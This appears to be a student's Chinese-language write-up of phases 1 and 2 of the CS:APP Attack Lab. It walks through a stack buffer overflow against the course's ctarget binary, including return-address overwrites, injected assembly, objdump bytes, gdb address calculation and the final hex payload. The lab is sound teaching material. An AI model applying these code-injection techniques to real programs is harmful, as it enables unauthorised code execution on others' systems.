# Attacklab

做到这个lab才发现有writeup。

## phase_1

目标是通过注入实现调用touch1函数。

先用objdump -d把汇编代码搞出来，查看getbuf和test函数开了多大的栈空间。我这里的getbuf开的是0x28，那就构造一个40个字节的输入数据先填满它，再构造一个8字节的数据覆盖test函数在栈里的位置，程序就会执行那8个字节指向位置的代码了。

这里要我们执行touch1函数，在汇编代码里查看其对应字节是00000000004017c0，注意要改成小端法表示，加到那40个字节后面即可。

随后`./hex2raw -i touch1.txt | ./ctarget -q`即完成phase_1。

## phase_2

目标是通过注入代码实现调用touch2并把参数设置成自己的cookie(我的cookie是0x59b997fa）。

注入的代码中不能含有call和jmp指令，因此要调用touch2函数，只好先将touch2函数的地址压入栈中，随后借助ret指令执行。

因此要注入的代码如下

```c
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```

如何注入？首先将上述代码保存为touch2.s，通过gcc touch2.s -c 命令将其编译但不链接，生成touch2.o文件。随后通过objdump touch2.o -d 即可得到上述汇编代码对应的字节码

```shell
root@YJMSTR-Alienware17:/mnt/c/csapp/attacklab/target1# objdump -d touch2.o

touch2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq
```

我们要的是`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`.

随后根据上述数据构造48字节的输入数据，前40个字节包含我们的攻击代码，最后8个字节覆盖原先栈中的返回地址，使其指向我们注入的代码的起始地址。

可以在gdb中通过单步调试和layout reg获取%rsp的值，用于计算我们注入的代码的起始地址。在getbuf函数打个断电，当程序运行到这个断点时，%rsp的值为 0x5561dca0，再单步执行一步，把它减去0x28，即为我们输入的字节码存放的起始地址0x5561dc78 。由于x86-64的linux系统是小端法表示，需要将其写成78 dc 61 55 00 00 00 00.

最终我们的输入文件touch2.txt中的内容如下

```assembly
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
```

执行命令`./hex2raw -i touch2.txt | ./ctarget -q `，即完成phase_2.



